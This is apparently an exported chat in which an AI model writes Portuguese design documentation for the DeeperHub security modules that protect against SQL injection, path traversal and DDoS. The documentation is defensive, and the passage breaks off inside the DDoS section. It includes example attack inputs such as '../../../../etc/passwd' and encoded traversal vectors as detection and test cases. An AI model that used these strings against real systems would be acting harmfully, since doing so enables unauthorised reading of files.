### 6.5. `DeeperHub.Security.SqlInjectionProtection.record_injection_attempt(input_string :: String.t(), source_info :: map(), context :: map() | nil) :: :ok`

*   **Descri√ß√£o:** Registra uma tentativa de SQL Injection detectada.
*   **`source_info`:** `%{ip_address: \"...\", user_id: \"...\", path: \"...\"}`.
*   **`context`:** `%{field_name: \"...\", query_type: \"...\"}`.

## ‚öôÔ∏è 7. Configura√ß√£o

Via `DeeperHub.Core.ConfigManager` e/ou `DeeperHub.Security.Policy.SecurityPolicyManager`:

*   **`[:security, :sql_injection_protection, :enabled]`** (Boolean): Habilita/desabilita as verifica√ß√µes. (Padr√£o: `true`)
*   **`[:security, :sql_injection_protection, :detection_patterns]`** (List de Regex): Lista de padr√µes regex usados por `check_string/2` e `check_query/2`.
*   **`[:security, :sql_injection_protection, :allowed_sort_columns, <context_key>]`** (List de Strings): Lista branca de colunas permitidas para ordena√ß√£o din√¢mica em diferentes contextos (ex: `user_list`, `server_list`).
*   **`[:security, :sql_injection_protection, :log_suspicious_attempts]`** (Boolean): Se tentativas detectadas devem ser logadas. (Padr√£o: `true`)
*   **`[:security, :sql_injection_protection, :block_on_suspicious_input]`** (Boolean): Se deve bloquear requisi√ß√µes que contenham entradas suspeitas (a√ß√£o agressiva). (Padr√£o: `false`, geralmente apenas loga/alerta).

## üîó 8. Depend√™ncias

### 8.1. M√≥dulos Internos

*   `DeeperHub.Core.ConfigManager`: Para configura√ß√µes.
*   `DeeperHub.Core.Logger`: Para logging de tentativas e erros.
*   `DeeperHub.Core.Metrics`: Para m√©tricas.
*   `DeeperHub.Audit`: Para registrar tentativas bloqueadas.
*   `Ecto`: Indiretamente, pois o objetivo √© proteger as queries Ecto.

### 8.2. Bibliotecas Externas

*   Nenhuma espec√≠fica para a l√≥gica de detec√ß√£o baseada em regex ou valida√ß√£o de lista branca. Bibliotecas de parsing SQL poderiam ser usadas para an√°lises mais profundas, mas adicionam complexidade.

## ü§ù 9. Como Usar / Integra√ß√£o

*   **Priorizar Ecto:** A principal estrat√©gia √© usar `Ecto.Query` e changesets corretamente.
    ```elixir
    # SEGURO
    def get_user_by_name(name_param) do
      from(u in User, where: u.name == ^name_param) |> Repo.one()
    end
    ```
*   **Valida√ß√£o de Lista Branca para Identificadores Din√¢micos:**
    ```elixir
    def list_products(sort_field_param, sort_order_param) do
      valid_fields = ~w(name price created_at)a
      valid_orders = ~w(asc desc)a

      sort_field = if Enum.member?(valid_fields, String.to_atom(sort_field_param)), do: String.to_atom(sort_field_param), else: :name
      sort_order = if Enum.member?(valid_orders, String.to_atom(sort_order_param)), do: String.to_atom(sort_order_param), else: :asc
      
      # Adicionalmente, pode-se chamar check_string/2 para logar se a entrada original era suspeita
      DeeperHub.Security.SqlInjectionProtection.check_string(sort_field_param)
      DeeperHub.Security.SqlInjectionProtection.check_string(sort_order_param)

      from(p in Product, order_by: [{^sort_order, ^sort_field}]) |> Repo.all()
    end
    ```
*   **Verificar Entradas Suspeitas (ex: em um Plug de Seguran√ßa Gen√©rico):**
    ```elixir
    # Plug para verificar todos os par√¢metros de uma requisi√ß√£o
    Enum.each(conn.params, fn {key, value} ->
      if is_binary(value) do
        case DeeperHub.Security.SqlInjectionProtection.check_string(value, %{source_field: key}) do
          {:ok, :suspicious} ->
            DeeperHub.Security.SqlInjectionProtection.record_injection_attempt(value, %{ip: ..., path: ...}, %{field: key})
            # Pode-se decidir bloquear a requisi√ß√£o aqui se a pol√≠tica for agressiva
          _ -> :ok
        end
      end
    end)
    ```

## ‚úÖ 10. Testes e Observabilidade

### 10.1. Testes

*   Testar `check_string/2` e `check_query/2` com v√°rios vetores de SQL Injection conhecidos para diferentes dialetos SQL.
*   Testar `sanitize_string/2` para garantir que ele escape corretamente os caracteres perigosos.
*   Verificar a l√≥gica de valida√ß√£o de lista branca para identificadores din√¢micos.
*   Localiza√ß√£o: `test/deeper_hub/security/sql_injection_protection/`.

### 10.2. M√©tricas

*   `deeper_hub.security.sqli.input_checked.count` (tags: `context`, `result` (`safe`, `suspicious`))
*   `deeper_hub.security.sqli.suspicious_pattern_detected.count` (tags: `pattern_type`, `context`)
*   `deeper_hub.security.sqli.attempts_recorded.count`

### 10.3. Logs

*   **N√≠vel WARNING:** `check_string/2` ou `check_query/2` detecta um padr√£o suspeito.
*   **N√≠vel ERROR:** Tentativa de SQL Injection confirmada e bloqueada (se configurado para bloquear).

### 10.4. Telemetria

*   `[:deeper_hub, :security, :sqli, :check_string, :stop]`
    *   Metadados: `%{input_sample: String.slice(input, 0, 50), result: :safe | :suspicious, threats: list_of_threats}`
*   `[:deeper_hub, :security, :sqli, :sanitize_string, :stop]`
    *   Metadados: `%{input_changed: boolean}`

## ‚ùå 11. Tratamento de Erros

*   A detec√ß√£o de um padr√£o suspeito por `check_string/2` ou `check_query/2` deve, no m√≠nimo, gerar um log/alerta. A decis√£o de bloquear a requisi√ß√£o depende da pol√≠tica (`:block_on_suspicious_input`).
*   Erros no pr√≥prio servi√ßo de prote√ß√£o (ex: regex malformada na configura√ß√£o) devem ser logados criticamente.

## üõ°Ô∏è 12. Considera√ß√µes de Seguran√ßa (do pr√≥prio M√≥dulo)

*   **Regexes de Detec√ß√£o:** As express√µes regulares usadas para detectar padr√µes de SQLi devem ser cuidadosamente elaboradas para evitar falsos positivos excessivos e para cobrir uma ampla gama de vetores de ataque. Elas tamb√©m podem ser um gargalo de performance se forem muito complexas e aplicadas a muitas entradas.
*   **Escaping Insuficiente:** A sanitiza√ß√£o por escaping √© inerentemente mais fr√°gil do que a parametriza√ß√£o. Diferentes bancos de dados t√™m diferentes necessidades de escaping.
*   **Contexto √© Importante:** Um \"padr√£o suspeito\" em um campo de texto livre pode ser diferente de um padr√£o suspeito em um campo que se espera ser um n√∫mero.

## üßë‚Äçüíª 13. Contribui√ß√£o

*   **N√ÉO CONSTRUA QUERIES SQL CONCATENANDO STRINGS DE ENTRADA DO USU√ÅRIO.** Use Ecto e consultas parametrizadas.
*   Use este m√≥dulo principalmente para:
    *   Validar identificadores (nomes de colunas/tabelas) contra listas brancas se eles precisarem ser din√¢micos.
    *   Como uma camada de verifica√ß√£o adicional para logar/alertar sobre entradas suspeitas, mesmo que a query principal seja parametrizada.
*   Mantenha os padr√µes de detec√ß√£o (regexes) atualizados com base em novas t√©cnicas de SQLi.

## üîÆ 14. Melhorias Futuras e TODOs

*   [ ] Integrar com bibliotecas de parsing SQL mais robustas para uma an√°lise sint√°tica e sem√¢ntica das queries, em vez de depender apenas de regex.
*   [ ] Desenvolver uma \"API de query segura\" mais elaborada (`generate_safe_query/2`) que abstraia a constru√ß√£o de queries Ecto din√¢micas comuns de forma segura.
*   [ ] Adicionar aprendizado de m√°quina para identificar queries SQL an√¥malas com base no tr√°fego normal do banco de dados.
*   [ ] Fornecer mais contexto para as fun√ß√µes `check_string` e `sanitize_string` sobre onde a string ser√° usada (ex: dentro de um literal string, como um identificador, em uma cl√°usula num√©rica) para aplicar regras de sanitiza√ß√£o/valida√ß√£o mais precisas.

---

*√öltima atualiza√ß√£o: 2025-05-12*

---

Prote√ß√£o contra SQL Injection √© um cl√°ssico da seguran√ßa web!

O pr√≥ximo poderia ser `DeeperHub.Security.XssProtection` (que j√° documentamos) ou `DeeperHub.Security.PathTraversalProtection` ou `DeeperHub.Security.DdosProtection`. Qual prefere?"""),
            ],
        ),
        types.Content(
            role="user",
            parts=[
                types.Part.from_text(text="""continue"""),
            ],
        ),
        types.Content(
            role="model",
            parts=[
                types.Part.from_text(text="""J√° documentamos o `DeeperHub.Security.XssProtection`.

Que tal seguirmos com o `DeeperHub.Security.PathTraversalProtection`? √â outra vulnerabilidade comum relacionada ao acesso a arquivos.

---

# M√≥dulo: `DeeperHub.Security.PathTraversalProtection` üöÄ

## üìú 1. Vis√£o Geral do M√≥dulo `DeeperHub.Security.PathTraversalProtection`

O m√≥dulo `DeeperHub.Security.PathTraversalProtection` √© dedicado a prevenir ataques de **Path Traversal (tamb√©m conhecido como Directory Traversal)** no sistema DeeperHub. Este tipo de ataque ocorre quando um invasor manipula vari√°veis de entrada que s√£o usadas para construir caminhos de arquivos, com o objetivo de acessar arquivos ou diret√≥rios fora do diret√≥rio raiz pretendido pela aplica√ß√£o. Sequ√™ncias como `../` (ponto-ponto-barra) s√£o comumente usadas para \"subir\" na hierarquia de diret√≥rios.

Este m√≥dulo fornece funcionalidades para:
1.  Verificar se um caminho fornecido pelo usu√°rio cont√©m sequ√™ncias de path traversal.
2.  Sanitizar caminhos para remover ou neutralizar essas sequ√™ncias.
3.  Normalizar caminhos para uma forma can√¥nica.
4.  Verificar se um caminho resolvido reside dentro de um diret√≥rio base permitido.

O objetivo √© garantir que o acesso a arquivos seja restrito aos diret√≥rios designados e que entradas maliciosas n√£o resultem em acesso n√£o autorizado a arquivos sens√≠veis do sistema. üòä

## üéØ 2. Responsabilidades e Funcionalidades Chave

*   **Detec√ß√£o de Path Traversal (`check_path/2`):**
    *   Analisar uma string de caminho para identificar a presen√ßa de sequ√™ncias como `../`, `..\\`, ou suas varia√ß√µes codificadas (ex: `%2e%2e%2f`).
*   **Sanitiza√ß√£o de Caminhos (`sanitize_path/2`):**
    *   Remover ou neutralizar sequ√™ncias de path traversal de uma string de caminho.
    *   Opcionalmente, resolver o caminho para sua forma can√¥nica ap√≥s a sanitiza√ß√£o.
*   **Normaliza√ß√£o de Caminhos (`normalize_path/2`):**
    *   Converter um caminho para sua forma can√¥nica e absoluta, resolvendo `.` e `..` e removendo barras duplicadas.
*   **Verifica√ß√£o de Diret√≥rio Base (`verify_path_in_base/3`):**
    *   Garantir que um caminho normalizado e absoluto esteja contido dentro de um ou mais diret√≥rios base permitidos e configurados.
*   **Configura√ß√£o de Diret√≥rios Base Permitidos (`configure_allowed_dirs/1`):**
    *   Permitir que administradores definam quais diret√≥rios s√£o seguros para a aplica√ß√£o acessar ou servir arquivos.
*   **Registro de Tentativas (`record_attempt/2`):**
    *   Logar tentativas de path traversal detectadas para auditoria e monitoramento.
*   **Estat√≠sticas (`get_statistics/1`):**
    *   Coletar m√©tricas sobre tentativas de path traversal detectadas.
*   **Integra√ß√£o com Upload/Download de Arquivos:**
    *   Ser utilizado por m√≥dulos que lidam com upload, download ou qualquer forma de acesso a arquivos baseada em entrada do usu√°rio.

## üèóÔ∏è 3. Arquitetura e Design

### 3.1. Componentes Principais

1.  **`DeeperHub.Security.PathTraversalProtection` (Fachada P√∫blica):**
    *   Ponto de entrada para as funcionalidades de prote√ß√£o.
    *   Delega para o `PathTraversalProtectionService`.
2.  **`DeeperHub.Security.PathTraversalProtection.Services.PathTraversalProtectionService` (M√≥dulo Funcional):**
    *   **Responsabilidade:** Cont√©m a l√≥gica principal para `check_path`, `sanitize_path`, `normalize_path`, e `verify_path_in_base`.
    *   **Intera√ß√µes:**
        *   Utiliza fun√ß√µes do m√≥dulo `Path` do Elixir para manipula√ß√£o de caminhos.
        *   Interage com `DeeperHub.Core.ConfigManager` para obter a lista de diret√≥rios base permitidos e outras configura√ß√µes.
        *   Interage com `DeeperHub.Audit` ou `DeeperHub.Security.Monitoring` para registrar tentativas.
3.  **Configura√ß√µes (via `DeeperHub.Core.ConfigManager` e `DeeperHub.Security.Policy.SecurityPolicyManager`):**
    *   Lista de diret√≥rios base permitidos.
    *   Padr√µes de detec√ß√£o (se usar regex mais avan√ßadas).
    *   Pol√≠tica de a√ß√£o ao detectar uma tentativa (logar, bloquear).

### 3.2. Estrutura de Diret√≥rios (Proposta)

```
lib/deeper_hub/security/path_traversal_protection/
‚îú‚îÄ‚îÄ path_traversal_protection.ex                 # Fachada P√∫blica
‚îÇ
‚îî‚îÄ‚îÄ services/
    ‚îî‚îÄ‚îÄ path_traversal_protection_service.ex     # L√≥gica principal
```
*(Este m√≥dulo √© geralmente mais simples e pode n√£o necessitar de um GenServer ou supervisor pr√≥prio, a menos que gerencie estado complexo ou tarefas de background, o que n√£o √© t√≠pico para esta funcionalidade.)*

### 3.3. Decis√µes de Design Importantes

*   **Normaliza√ß√£o Antes da Verifica√ß√£o:** √â crucial normalizar os caminhos para sua forma can√¥nica antes de realizar verifica√ß√µes de diret√≥rio base. Isso ajuda a evitar bypasses usando diferentes codifica√ß√µes ou sequ√™ncias de `.` e `..`.
*   **Verifica√ß√£o de Lista Branca de Diret√≥rios Base:** A abordagem mais segura √© definir explicitamente quais diret√≥rios a aplica√ß√£o pode acessar.
*   **Cuidado com Symlinks:** A normaliza√ß√£o (`Path.expand/1`) resolve symlinks. √â importante estar ciente de como isso interage com as verifica√ß√µes de diret√≥rio base, para evitar que um symlink aponte para fora de um diret√≥rio permitido.
*   **Contexto do Sistema Operacional:** A manipula√ß√£o de caminhos pode ter nuances dependendo do sistema operacional (barras vs. contrabarras). O m√≥dulo `Path` do Elixir ajuda a abstrair isso.

## üõ†Ô∏è 4. Casos de Uso Principais

*   **Download de Arquivo Solicitado pelo Usu√°rio:**
    *   Usu√°rio clica em um link: `/download?file=report.pdf`. O backend recebe `filename = \"report.pdf\"`.
    *   Antes de acessar o arquivo:
        1.  `{:ok, :safe} = PathTraversalProtection.check_path(filename)`
        2.  `{:ok, normalized_filename} = PathTraversalProtection.normalize_path(Path.join(@upload_dir, filename))`
        3.  `{:ok, :allowed} = PathTraversalProtection.verify_path_in_base(normalized_filename, @upload_dir)`
    *   Se todas as verifica√ß√µes passarem, o arquivo √© servido.
*   **Tentativa de Acesso Malicioso:**
    *   Invasor tenta: `/download?file=../../../../etc/passwd`.
    *   `PathTraversalProtection.check_path(\"../../../../etc/passwd\")` retorna `{:ok, :unsafe}`.
    *   `PathTraversalProtection.record_attempt(\"../../../../etc/passwd\", %{ip: ..., user_id: ...})`.
    *   A requisi√ß√£o √© bloqueada.
*   **Upload de Arquivo com Nome Manipulado:**
    *   Usu√°rio tenta fazer upload de um arquivo com o nome `../avatar.jpg`.
    *   O servi√ßo de upload, antes de construir o caminho final, deve usar `Path.basename(user_supplied_filename)` para pegar apenas o nome do arquivo e depois junt√°-lo com o diret√≥rio de upload seguro, ou usar `sanitize_path` no nome do arquivo.

## üåä 5. Fluxos Importantes

### Fluxo de Valida√ß√£o de Caminho para Acesso a Arquivo

1.  **Entrada do Usu√°rio:** Aplica√ß√£o recebe um nome de arquivo ou caminho parcial de uma fonte n√£o confi√°vel (ex: par√¢metro de URL, formul√°rio).
2.  **Verifica√ß√£o Inicial (`check_path/2`):**
    *   `DeeperHub.Security.PathTraversalProtection.check_path(user_input_path)`
    *   Se retornar `{:ok, :unsafe}`, a opera√ß√£o √© imediatamente interrompida, a tentativa √© logada/auditada.
3.  **Constru√ß√£o do Caminho Completo:**
    *   Juntar o `user_input_path` (que passou na verifica√ß√£o inicial ou foi sanitizado) com o diret√≥rio base esperado para a opera√ß√£o (ex: `Path.join(Config.get(:upload_directory), user_input_path)`).
4.  **Normaliza√ß√£o do Caminho (`normalize_path/2`):**
    *   `{:ok, canonical_path} = DeeperHub.Security.PathTraversalProtection.normalize_path(full_path)`
    *   Isso resolve quaisquer `.` ou `..` que possam ter restado ou sido formados pela jun√ß√£o.
5.  **Verifica√ß√£o de Diret√≥rio Base (`verify_path_in_base/3`):**
    *   `DeeperHub.Security.PathTraversalProtection.verify_path_in_base(canonical_path, Config.get(:upload_directory))`
    *   Se retornar `{:ok, :denied}`, a opera√ß√£o √© interrompida, a tentativa √© logada/auditada.
6.  **Acesso ao Arquivo:** Se todas as verifica√ß√µes passarem, o `canonical_path` pode ser usado para acessar o arquivo.

## üì° 6. API (Fun√ß√µes P√∫blicas da Fachada)

### 6.1. `DeeperHub.Security.PathTraversalProtection.check_path(path :: String.t(), opts :: keyword()) :: {:ok, :safe | :unsafe} | {:error, term()}`

*   **Descri√ß√£o:** Verifica se uma string de caminho cont√©m sequ√™ncias de path traversal (ex: `../`). N√£o resolve ou normaliza o caminho.
*   **`opts`:**
    *   `:patterns_to_check` (list(Regex.t()), opcional): Regexes adicionais para verificar.
*   **Retorno:** `:safe` se nenhuma sequ√™ncia perigosa for detectada, `:unsafe` caso contr√°rio.

### 6.2. `DeeperHub.Security.PathTraversalProtection.sanitize_path(path :: String.t(), opts :: keyword()) :: {:ok, String.t()} | {:error, term()}`

*   **Descri√ß√£o:** Tenta remover ou neutralizar sequ√™ncias de path traversal de uma string de caminho.
*   **`opts`:**
    *   `:replacement_strategy` (atom): Como lidar com `../` (ex: `:remove`, `:replace_with_underscore`). (Padr√£o: `:remove`)
*   **Retorno:** A string de caminho sanitizada.

### 6.3. `DeeperHub.Security.PathTraversalProtection.normalize_path(path :: String.t(), opts :: keyword()) :: {:ok, String.t()} | {:error, term()}`

*   **Descri√ß√£o:** Converte um caminho para sua forma can√¥nica e absoluta, resolvendo `.` , `..` e symlinks (via `Path.expand/1`).
*   **`opts`:**
    *   `:relative_to` (String.t): Diret√≥rio base para resolver caminhos relativos. (Padr√£o: diret√≥rio de trabalho atual).
*   **Retorno:** O caminho absoluto e normalizado.
*   **Aten√ß√£o:** O uso de `Path.expand/1` implica acesso ao sistema de arquivos.

### 6.4. `DeeperHub.Security.PathTraversalProtection.verify_path_in_base(target_path :: String.t(), allowed_base_dir :: String.t() | list(String.t()), opts :: keyword()) :: {:ok, :allowed | :denied} | {:error, term()}`

*   **Descri√ß√£o:** Verifica se o `target_path` (que deve ser absoluto e normalizado) est√° contido dentro do `allowed_base_dir` (ou qualquer um na lista de diret√≥rios base).
*   **`opts`:**
    *   `:ensure_target_exists` (boolean): Se `true`, tamb√©m verifica se `target_path` existe no sistema de arquivos. (Padr√£o: `false`)
*   **Retorno:** `:allowed` se seguro, `:denied` se fora do diret√≥rio base.

### 6.5. `DeeperHub.Security.PathTraversalProtection.configure_allowed_dirs(list_of_absolute_paths :: list(String.t())) :: :ok | {:error, term()}`

*   **Descri√ß√£o:** Define a lista de diret√≥rios base que s√£o considerados seguros para a aplica√ß√£o acessar diretamente. Essa configura√ß√£o seria armazenada no `Core.ConfigManager`.
*   **Nota:** √â mais prov√°vel que essa configura√ß√£o seja gerenciada pelo `SecurityPolicyManager`.

### 6.6. `DeeperHub.Security.PathTraversalProtection.record_attempt(attempted_path :: String.t(), source_info :: map()) :: :ok`

*   **Descri√ß√£o:** Registra uma tentativa de path traversal.
*   **`source_info`:** `%{ip_address: \"...\", user_id: \"...\", request_path: \"...\"}`.

## ‚öôÔ∏è 7. Configura√ß√£o

Via `DeeperHub.Core.ConfigManager` e/ou `DeeperHub.Security.Policy.SecurityPolicyManager`:

*   **`[:security, :path_traversal, :enabled]`** (Boolean): Habilita/desabilita as verifica√ß√µes. (Padr√£o: `true`)
*   **`[:security, :path_traversal, :allowed_base_directories]`** (List de Strings): Lista de caminhos absolutos para os diret√≥rios base permitidos (ex: `[\"/var/www/deeper_hub/uploads\", \"/var/www/deeper_hub/public_assets\"]`). Esta √© uma configura√ß√£o CR√çTICA.
*   **`[:security, :path_traversal, :log_suspicious_attempts]`** (Boolean): Se tentativas detectadas devem ser logadas. (Padr√£o: `true`)
*   **`[:security, :path_traversal, :block_on_suspicious_attempt]`** (Boolean): Se deve bloquear a requisi√ß√£o ao detectar uma tentativa. (Padr√£o: `true` para a maioria dos casos)
*   **`[:security, :path_traversal, :default_sanitize_strategy]`** (Atom): Estrat√©gia padr√£o para `sanitize_path/2`. (Padr√£o: `:remove`)

## üîó 8. Depend√™ncias

### 8.1. M√≥dulos Internos

*   `DeeperHub.Core.ConfigManager`: Para obter a lista de diret√≥rios base permitidos e outras configura√ß√µes.
*   `DeeperHub.Core.Logger`: Para logging.
*   `DeeperHub.Audit` ou `DeeperHub.Security.Monitoring`: Para registrar tentativas.

### 8.2. Bibliotecas Externas

*   Nenhuma espec√≠fica, utiliza principalmente o m√≥dulo `Path` do Elixir.

## ü§ù 9. Como Usar / Integra√ß√£o

*   **Qualquer m√≥dulo que lide com caminhos de arquivo fornecidos pelo usu√°rio:**
    *   **Uploads:** Antes de salvar um arquivo com um nome fornecido pelo usu√°rio, use `Path.basename/1` no nome do arquivo do usu√°rio e depois junte-o com um diret√≥rio de upload seguro.
        ```elixir
        def handle_upload(user_supplied_filename, file_binary) do
          base_upload_dir = ConfigManager.get([:storage, :upload_dir]) # Ex: \"/srv/uploads\"
          safe_filename = Path.basename(user_supplied_filename) # Pega apenas o nome do arquivo
          
          # Valida√ß√£o adicional no safe_filename (ex: caracteres permitidos)
          # ...

          final_path = Path.join(base_upload_dir, safe_filename)

          # Verificar se final_path ainda est√° dentro do base_upload_dir (ap√≥s Path.join, pode n√£o ser necess√°rio se base_upload_dir for absoluto e safe_filename n√£o tiver barras)
          # Mas para ser extra seguro, especialmente se base_upload_dir puder ser relativo ou safe_filename puder ser manipulado:
          {:ok, normalized_final_path} = DeeperHub.Security.PathTraversalProtection.normalize_path(final_path)
          case DeeperHub.Security.PathTraversalProtection.verify_path_in_base(normalized_final_path, base_upload_dir) do
            {:ok, :allowed} -> File.write(normalized_final_path, file_binary)
            _ -> {:error, :unsafe_path}
          end
        end
        ```
    *   **Downloads/Acesso a Arquivos:**
        ```elixir
        def serve_file(conn, requested_file) do
          allowed_dirs = ConfigManager.get([:security, :path_traversal, :allowed_base_directories])
          
          case DeeperHub.Security.PathTraversalProtection.check_path(requested_file) do
            {:ok, :unsafe} ->
              DeeperHub.Security.PathTraversalProtection.record_attempt(requested_file, %{ip: ..., conn: conn})
              send_resp(conn, 403, \"Forbidden\")
            {:ok, :safe} ->
              # Tentar encontrar o arquivo em cada diret√≥rio base permitido
              found_path = Enum.find_value(allowed_dirs, fn base_dir ->
                potential_path = Path.join(base_dir, requested_file)
                {:ok, normalized_path} = DeeperHub.Security.PathTraversalProtection.normalize_path(potential_path)
                case DeeperHub.Security.PathTraversalProtection.verify_path_in_base(normalized_path, base_dir) do
                  {:ok, :allowed} when File.exists?(normalized_path) -> normalized_path
                  _ -> nil
                end
              end)

              if found_path do
                Plug.Conn.send_file(conn, 200, found_path)
              else
                send_resp(conn, 404, \"Not Found\")
              end
          end
        end
        ```

## ‚úÖ 10. Testes e Observabilidade

### 10.1. Testes

*   Testar `check_path/2` com v√°rios vetores de path traversal (ex: `../`, `..\\`, `%2e%2e%2f`, `..%2f`, caminhos absolutos inesperados).
*   Testar `sanitize_path/2` para garantir que ele remove/neutraliza corretamente as sequ√™ncias.
*   Testar `normalize_path/2` com caminhos complexos, incluindo `.` e `..`.
*   Testar `verify_path_in_base/3` com caminhos que est√£o dentro, fora, e na borda dos diret√≥rios base permitidos, incluindo casos com symlinks se relevante para o ambiente.
*   Localiza√ß√£o: `test/deeper_hub/security/path_traversal_protection/`.

### 10.2. M√©tricas

*   `deeper_hub.security.path_traversal.paths_checked.count`
*   `deeper_hub.security.path_traversal.unsafe_paths_detected.count` (tags: `context_operation`)
*   `deeper_hub.security.path_traversal.paths_sanitized.count`
*   `deeper_hub.security.path_traversal.access_denied_base_dir.count`

### 10.3. Logs

*   **N√≠vel WARNING:** `check_path/2` detecta um caminho `unsafe`. `verify_path_in_base/3` nega acesso.
*   **N√≠vel INFO/DEBUG:** Detalhes da normaliza√ß√£o de caminhos, se complexa.

### 10.4. Telemetria

*   `[:deeper_hub, :security, :path_traversal, :check_path, :stop]`
    *   Metadados: `%{input_path: path, result: :safe | :unsafe}`
*   `[:deeper_hub, :security, :path_traversal, :verify_base, :stop]`
    *   Metadados: `%{target_path: path, base_dir: dir, result: :allowed | :denied}`

## ‚ùå 11. Tratamento de Erros

*   Detec√ß√£o de path traversal (`:unsafe` ou `:denied`) deve, na maioria dos casos, resultar no bloqueio da opera√ß√£o e, possivelmente, da requisi√ß√£o.
*   Erros internos no servi√ßo (ex: falha ao ler configura√ß√£o de diret√≥rios base) devem ser logados criticamente e o sistema deve falhar de forma segura (negar acesso a arquivos).

## üõ°Ô∏è 12. Considera√ß√µes de Seguran√ßa (do pr√≥prio M√≥dulo)

*   **Configura√ß√£o Correta dos Diret√≥rios Base:** A seguran√ßa deste m√≥dulo depende fortemente da configura√ß√£o correta e restritiva dos `allowed_base_directories`. Eles devem ser caminhos absolutos e n√£o devem ser muito amplos.
*   **Symlinks:** Se o sistema de arquivos subjacente usa symlinks, `Path.expand/1` (usado em `normalize_path`) os resolver√°. √â preciso garantir que um symlink dentro de um diret√≥rio permitido n√£o aponte para uma localiza√ß√£o fora dele que n√£o deveria ser acess√≠vel.
*   **Codifica√ß√µes de Caminho:** Esteja ciente de diferentes codifica√ß√µes de caracteres (URL encoding, double encoding) que os invasores podem usar para tentar contornar as verifica√ß√µes. As fun√ß√µes de verifica√ß√£o devem lidar com as formas can√¥nicas.

## üßë‚Äçüíª 13. Contribui√ß√£o

*   Sempre valide e normalize caminhos antes de us√°-los em opera√ß√µes de sistema de arquivos.
*   Use `Path.join/2` para construir caminhos de forma segura, mas sempre valide o resultado final se algum componente vier de entrada n√£o confi√°vel.
*   Ao definir `allowed_base_directories`, seja o mais espec√≠fico poss√≠vel.

## üîÆ 14. Melhorias Futuras e TODOs

*   [ ] Adicionar suporte para pol√≠ticas de path traversal mais granulares, baseadas no contexto da opera√ß√£o ou no tipo de arquivo.
*   [ ] Integrar com um sistema de \"sandboxing\" ou capabilities no n√≠vel do sistema operacional para restringir ainda mais onde o processo Elixir pode ler/escrever arquivos, como uma camada de defesa adicional.
*   [ ] Desenvolver regexes mais sofisticadas para `check_path/2` para detectar t√©cnicas de evas√£o mais obscuras, mantendo a performance.
*   [ ] Op√ß√£o para normalizar caminhos sem acessar o sistema de arquivos (ou seja, sem resolver symlinks via `Path.expand`), √∫til para valida√ß√£o pura de strings de caminho antes de qualquer I/O.

---

*√öltima atualiza√ß√£o: 2025-05-12*

---

Prote√ß√£o contra Path Traversal √© crucial para qualquer aplica√ß√£o que lida com arquivos.

O que vem agora? Poder√≠amos cobrir `DeeperHub.Security.DdosProtection` ou talvez mudar para um m√≥dulo Core como `DeeperHub.Core.Cache` para variar um pouco?"""),
            ],
        ),
        types.Content(
            role="user",
            parts=[
                types.Part.from_text(text="""continue"""),
            ],
        ),
        types.Content(
            role="model",
            parts=[
                types.Part.from_text(text="""Ok, vamos continuar com a camada de seguran√ßa e detalhar o `DeeperHub.Security.DdosProtection`. Ataques de Nega√ß√£o de Servi√ßo Distribu√≠da s√£o uma amea√ßa significativa para a disponibilidade de qualquer servi√ßo online.

---

# M√≥dulo: `DeeperHub.Security.DdosProtection` üöÄ

## üìú 1. Vis√£o Geral do M√≥dulo `DeeperHub.Security.DdosProtection`

O m√≥dulo `DeeperHub.Security.DdosProtection` √© projetado para proteger o sistema DeeperHub contra ataques de **Nega√ß√£o de Servi√ßo Distribu√≠da (DDoS)** e ataques de Nega√ß√£o de Servi√ßo (DoS) mais simples. O objetivo desses ataques √© sobrecarregar os recursos do servidor (CPU, mem√≥ria, largura de banda, conex√µes de banco de dados) com um volume massivo de tr√°fego ileg√≠timo, tornando a aplica√ß√£o indispon√≠vel para usu√°rios leg√≠timos.

Este m√≥dulo implementa v√°rias estrat√©gias para mitigar esses ataques, incluindo:
1.  **Limita√ß√£o de Taxa (Rate Limiting) Agressiva:** Aplicar limites de taxa mais rigorosos baseados em IP e, potencialmente, em outros identificadores, para tr√°fego geral ou para endpoints espec√≠ficos durante um ataque percebido.
2.  **Bloqueio de IPs:** Identificar e bloquear IPs que participam de um ataque.
3.  **Detec√ß√£o de Padr√µes de Ataque:** Analisar padr√µes de tr√°fego para identificar caracter√≠sticas de ataques DDoS (ex: floods SYN, HTTP floods).
4.  **Modos de Prote√ß√£o Avan√ßada:** Capacidade de alternar para um modo de prote√ß√£o mais restritivo durante um ataque.
5.  **Integra√ß√£o com Servi√ßos Externos de Mitiga√ß√£o DDoS (Opcional):** Facilitar a integra√ß√£o com servi√ßos como Cloudflare, AWS Shield, etc.

O foco √© manter a disponibilidade do DeeperHub mesmo sob condi√ß√µes de tr√°fego anormais ou maliciosas. üòä

## üéØ 2. Responsabilidades e Funcionalidades Chave

*   **Monitoramento de Tr√°fego:**
    *   Analisar o volume e a natureza das requisi√ß√µes recebidas (`record_request/3`).
    *   Identificar picos anormais de tr√°fego ou padr√µes suspeitos.
*   **Limita√ß√£o de Taxa Global e por Endpoint:**
    *   Aplicar limites de taxa gerais para IPs individuais.
    *   Permitir a configura√ß√£o de limites de taxa espec√≠ficos para endpoints mais sens√≠veis ou visados (`configure_rate_limit/3`).
    *   (Delega√ß√£o para `DeeperHub.API.RateLimiter` para a mec√¢nica, mas com pol√≠ticas espec√≠ficas para DDoS aqui).
*   **Detec√ß√£o e Bloqueio de IPs Atacantes:**
    *   Identificar IPs que excedem significativamente os limites de taxa ou que participam de padr√µes de ataque conhecidos.
    *   Bloquear esses IPs tempor√°ria ou permanentemente (`block_ip/3`, `unblock_ip/1`).
    *   Manter uma lista de IPs bloqueados (via `IPFirewallService` ou um cache interno).
*   **An√°lise de Padr√µes de Ataque:**
    *   Implementar (ou integrar com ferramentas que implementam) detec√ß√£o para tipos comuns de ataques DDoS (ex: HTTP flood, Slowloris - mais complexo).
*   **Modo de Prote√ß√£o Avan√ßada/Sob Ataque (`set_advanced_protection/2`):**
    *   Permitir a ativa√ß√£o de um modo de \"sob ataque\" que aplica regras mais estritas, como:
        *   Limites de taxa mais baixos.
        *   Desafios de JavaScript ou CAPTCHA mais agressivos para novos visitantes.
        *   Bloqueio de faixas de IPs suspeitas ou de geografias conhecidas por originar ataques.
*   **Relat√≥rios e Estat√≠sticas (`get_statistics/1`):**
    *   Fornecer estat√≠sticas sobre o tr√°fego, requisi√ß√µes bloqueadas/limitadas e IPs bloqueados.
*   **Integra√ß√£o com WAF/Servi√ßos Externos (Opcional):**
